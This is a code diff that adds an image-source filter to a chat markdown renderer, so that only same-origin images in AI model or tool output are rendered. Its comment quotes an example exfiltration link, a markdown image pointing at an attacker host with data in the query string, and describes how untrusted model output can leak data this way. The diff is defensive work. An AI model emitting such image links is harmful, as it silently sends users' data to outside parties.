@@ -10,6 +10,19 @@ import remarkGfm from 'remark-gfm'
 import Link from 'next/link'
 import { cn } from '@openbooks/ui'
 
+// Assistant output renders untrusted model and tool text, so a markdown
+// image is a network request the model chooses: `![](https://attacker/?d=…)`
+// exfiltrates whatever the URL carries the moment it renders. Only
+// same-origin file responses render — anything else leaves its alt text as a
+// muted placeholder, so the reader sees an image was suppressed instead of
+// fetching it. (The markdown parser already drops data:/blob:/javascript:
+// schemes before this point; this gates what remains.) This mirrors the
+// `img-src 'self' blob: data:` policy in web/lib/content-security-policy.ts;
+// either layer alone stops the request.
+function isAllowedImageSrc(src: string | Blob | undefined): boolean {
+  return typeof src === 'string' && src.startsWith('/') && !src.startsWith('//')
+}
+
 export function ChatMarkdown({ children, className }: { children: string; className?: string }) {
   return (
     <div
@@ -37,6 +50,15 @@ export function ChatMarkdown({ children, className }: { children: string; classN
               <a href={href} target="_blank" rel="noreferrer">
                 {linkChildren}
               </a>
+            ),
+          img: ({ src, alt }) =>
+            isAllowedImageSrc(src) ? (
+              // eslint-disable-next-line @next/next/no-img-element
+              <img src={src} alt={alt ?? ''} className="max-w-full rounded" />
+            ) : (
+              <span className="text-xs italic text-slate-400 dark:text-slate-500">
+                {alt || 'image'}
+              </span>
             ),
         }}
       >
